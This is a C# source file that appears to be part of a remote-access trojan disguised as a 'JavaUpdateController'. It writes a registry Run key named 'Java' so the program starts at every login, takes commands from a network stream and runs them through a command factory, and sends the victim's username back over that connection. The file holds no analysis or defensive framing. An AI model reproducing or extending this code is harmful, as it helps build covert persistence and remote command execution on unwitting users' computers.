using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using JavaUpdateController;

namespace JavaUpdateController
{
    class Functions
    {
        public static void DeleteStartUp()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue("Java", false);
        }

        public static void AddStartUp()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Java", @"C:\Users\" + Environment.UserName + @"\Desktop\JavaUpdateController.exe");
        }

        public static void WorkCommand(String msg, NetworkStream stream)
        {
            String[] list = msg.Split('@');
            Console.WriteLine(list[0] + " " + list[1]);
            ICommand work = FactoryCommand.GetCommand((int)Char.GetNumericValue(list[0].ToCharArray()[0]), stream);
            work.Execute(list);
        }

        public static void SendUser(NetworkStream stream)
        {
            byte[] mesaj;
            string user = Environment.UserName;
            mesaj = Encoding.ASCII.GetBytes(user);
            stream.Write(mesaj, 0, mesaj.Length);
        }
    }
}
